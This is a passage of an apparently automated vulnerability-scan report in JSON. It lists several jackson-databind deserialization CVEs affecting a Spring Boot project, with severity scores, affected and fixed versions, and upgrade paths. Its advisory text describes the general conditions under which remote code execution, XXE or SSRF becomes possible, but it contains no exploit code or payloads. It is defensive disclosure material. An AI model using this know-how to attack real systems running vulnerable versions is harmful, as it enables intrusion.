      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.6.4"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2018-10-11T17:16:09.944095Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. An attacker could perform a Remote Code Execution attack, if the user is handling untrusted content or using the `Default Typing` feature. This vulnerability is due to an incomplete fix for the [CVE-2017-7525](https://snyk.io/vuln/SNYK-JAVA-COMFASTERXMLJACKSONCORE-31507) deserialization flaw.\r\n\r\n**Note:** This vulnerability (`CVE-2018-12023`) is not identical to `CVE-2018-12018`, `CVE-2018-12019`, `CVE-2018-14720`, `CVE-2018-14721`, `CVE-2018-14722` and `CVE-2018-11307`.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Don’t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.6.7.3, 2.7.9.4, 2.8.11.2, 2.9.6 or higher.\n## References\n- [GitHub Commit](https://github.com/FasterXML/jackson-databind/commit/28badf7ef60ac3e7ef151cd8e8ec010b8479226a)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2058)\n",
      "disclosureTime": "2018-05-29T17:15:50Z",
      "exploit": "Unproven",
      "fixedIn": [
        "2.6.7.3",
        "2.7.9.4",
        "2.8.11.2",
        "2.9.6"
      ],
      "functions": [
        {
          "functionId": {
            "className": "ObjectMapper",
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.7.9.4)",
            "[2.8.0,2.8.11.2)",
            "[2.9.0,2.9.6)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.7.9.4)",
            "[2.8.0,2.8.11.2)",
            "[2.9.0,2.9.6)"
          ]
        }
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-72447",
      "identifiers": {
        "CVE": [
          "CVE-2018-12023"
        ],
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-6wqp-v4v6-c87c"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "jackson-databind",
        "groupId": "com.fasterxml.jackson.core"
      },
      "modificationTime": "2020-11-15T16:06:01.747120Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2018-10-11T17:15:49Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/FasterXML/jackson-databind/commit/28badf7ef60ac3e7ef151cd8e8ec010b8479226a"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2058"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.6.7.3)",
          "[2.7.0,2.7.9.4)",
          "[2.8.0,2.8.11.2)",
          "[2.9.0,2.9.6)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.6.4"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@1.5.14.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.8.11.2"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.6.4"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2018-10-11T17:21:07.540945Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. An attacker could perform a Remote Code Execution attacks via the ` slf4j-ext` gadget due to an incomplete fix for the [CVE-2017-7525](https://snyk.io/vuln/SNYK-JAVA-COMFASTERXMLJACKSONCORE-31507) deserialization flaw.\r\n\r\n**Note:** This vulnerability (`CVE-2018-14718`) is not identical to `CVE-2018-12019`, `CVE-2018-14720`, `CVE-2018-14721`, `CVE-2018-14722`,`CVE-2018-12023` and `CVE-2018-11307`.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Don’t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.6.7.3, 2.7.9.5, 2.8.11.3, 2.9.7 or higher.\n## References\n- [GitHub Commit](https://github.com/FasterXML/jackson-databind/commit/87d29af25e82a249ea15858e2d4ecbf64091db44)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2097)\n",
      "disclosureTime": "2018-07-27T17:19:49Z",
      "exploit": "Unproven",
      "fixedIn": [
        "2.6.7.3",
        "2.7.9.5",
        "2.8.11.3",
        "2.9.7"
      ],
      "functions": [
        {
          "functionId": {
            "className": "ObjectMapper",
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.7)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.7)"
          ]
        }
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-72448",
      "identifiers": {
        "CVE": [
          "CVE-2018-14718"
        ],
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-645p-88qh-w398"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "jackson-databind",
        "groupId": "com.fasterxml.jackson.core"
      },
      "modificationTime": "2021-07-06T14:09:20.824044Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2018-10-11T17:19:41Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/FasterXML/jackson-databind/commit/87d29af25e82a249ea15858e2d4ecbf64091db44"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2097"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.6.7.3)",
          "[2.7.0,2.7.9.5)",
          "[2.8.0,2.8.11.3)",
          "[2.9.0,2.9.7)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.6.4"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@1.5.18.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.8.11.3"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.6.4"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2018-10-11T17:21:22.141403Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. An attacker could perform an XML External Entity (XXE) Injection via the `JDK` classes due to an incomplete fix for the [CVE-2017-7525](https://snyk.io/vuln/SNYK-JAVA-COMFASTERXMLJACKSONCORE-31507) deserialization flaw.\r\n\r\n**Note:** This vulnerability (`CVE-2018-14720`) is not identical to `CVE-2018-12018`, `CVE-2018-14729`, `CVE-2018-14721`, `CVE-2018-14722`,`CVE-2018-12023` and `CVE-2018-11307`.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Don’t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.6.7.3, 2.7.9.5, 2.8.11.3, 2.9.7 or higher.\n## References\n- [GitHub Commit](https://github.com/FasterXML/jackson-databind/commit/87d29af25e82a249ea15858e2d4ecbf64091db44)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2097)\n",
      "disclosureTime": "2018-07-27T17:20:17Z",
      "exploit": "Unproven",
      "fixedIn": [
        "2.6.7.3",
        "2.7.9.5",
        "2.8.11.3",
        "2.9.7"
      ],
      "functions": [
        {
          "functionId": {
            "className": "ObjectMapper",
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.7)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.7)"
          ]
        }
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-72449",
      "identifiers": {
        "CVE": [
          "CVE-2018-14720"
        ],
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-x2w5-5m2g-7h5m"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "jackson-databind",
        "groupId": "com.fasterxml.jackson.core"
      },
      "modificationTime": "2021-07-06T14:09:09.489795Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2018-10-11T17:19:17Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/FasterXML/jackson-databind/commit/87d29af25e82a249ea15858e2d4ecbf64091db44"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2097"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.6.7.3)",
          "[2.7.0,2.7.9.5)",
          "[2.8.0,2.8.11.3)",
          "[2.9.0,2.9.7)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.6.4"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@1.5.18.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.8.11.3"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.6.4"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2018-10-11T17:23:45.326350Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. An attacker could perform a Remote Code Execution attack via the `blaze-ds-opt` gadget due to an incomplete fix for the [CVE-2017-7525](https://snyk.io/vuln/SNYK-JAVA-COMFASTERXMLJACKSONCORE-31507) deserialization flaw.\r\n\r\n**Note:** This vulnerability (`CVE-2018-14719`) is not identical to `CVE-2018-12018`, `CVE-2018-14720`, `CVE-2018-14721`, `CVE-2018-14722`,`CVE-2018-12023` and `CVE-2018-11307`.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Don’t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.6.7.3, 2.7.9.5, 2.8.11.3, 2.9.7 or higher.\n## References\n- [GitHub Commit](https://github.com/FasterXML/jackson-databind/commit/87d29af25e82a249ea15858e2d4ecbf64091db44)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2097)\n- [GitHub Release Notes](https://github.com/FasterXML/jackson-databind/blob/a066415d66a6b1a4688ff0ed25695aa3a86ac130/release-notes/VERSION-2.x)\n",
      "disclosureTime": "2018-07-27T17:22:45Z",
      "exploit": "Unproven",
      "fixedIn": [
        "2.6.7.3",
        "2.7.9.5",
        "2.8.11.3",
        "2.9.7"
      ],
      "functions": [
        {
          "functionId": {
            "className": "ObjectMapper",
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.7)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.7)"
          ]
        }
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-72450",
      "identifiers": {
        "CVE": [
          "CVE-2018-14719"
        ],
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-4gq5-ch57-c2mg"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "jackson-databind",
        "groupId": "com.fasterxml.jackson.core"
      },
      "modificationTime": "2021-07-06T14:09:21.062185Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2018-10-11T17:22:38Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/FasterXML/jackson-databind/commit/87d29af25e82a249ea15858e2d4ecbf64091db44"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2097"
        },
        {
          "title": "GitHub Release Notes",
          "url": "https://github.com/FasterXML/jackson-databind/blob/a066415d66a6b1a4688ff0ed25695aa3a86ac130/release-notes/VERSION-2.x"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.6.7.3)",
          "[2.7.0,2.7.9.5)",
          "[2.8.0,2.8.11.3)",
          "[2.9.0,2.9.7)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.6.4"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@1.5.18.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.8.11.3"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.6.4"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2018-10-11T17:25:40.161831Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. A malicious user could perform a SSRF attack via the `axis2-jaxws` gadget due to an incomplete fix for the [CVE-2017-7525](https://snyk.io/vuln/SNYK-JAVA-COMFASTERXMLJACKSONCORE-31507) deserialization flaw.\r\n\r\n**Note:** This vulnerability (`CVE-2018-14721`) is not identical to `CVE-2018-12018`, `CVE-2018-14719`, `CVE-2018-14720`, `CVE-2018-14722`,`CVE-2018-12023` and `CVE-2018-11307`.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Don’t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.6.7.3, 2.7.9.5, 2.8.11.3, 2.9.7 or higher.\n## References\n- [GitHub Commit](https://github.com/FasterXML/jackson-databind/commit/87d29af25e82a249ea15858e2d4ecbf64091db44)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2097)\n",
      "disclosureTime": "2018-07-27T17:24:46Z",
      "exploit": "Unproven",
      "fixedIn": [
        "2.6.7.3",
        "2.7.9.5",
        "2.8.11.3",
        "2.9.7"
      ],
      "functions": [
        {
          "functionId": {
            "className": "ObjectMapper",
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.7)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.7)"
          ]
        }
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-72451",
      "identifiers": {
        "CVE": [
          "CVE-2018-14721"
        ],
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-9mxf-g3x6-wv74"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "jackson-databind",
        "groupId": "com.fasterxml.jackson.core"
      },
      "modificationTime": "2021-07-06T14:09:14.989820Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2018-10-11T17:24:39Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/FasterXML/jackson-databind/commit/87d29af25e82a249ea15858e2d4ecbf64091db44"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2097"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.6.7.3)",
          "[2.7.0,2.7.9.5)",
          "[2.8.0,2.8.11.3)",
          "[2.9.0,2.9.7)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.6.4"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@1.5.18.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.8.11.3"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.6.4"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2019-01-03T14:17:19.256477Z",
      "credit": [
        "Wuguixiong"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. An attacker could perform a Remote Code Execution attacks due to not blocking the `jboss-common-core ` class from polymorphic deserialization.\r\n\r\n**Note** This vulnerability (`CVE-2018-19362`) is not identical to `CVE-2018-19360` and `CVE-2018-19361`.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the 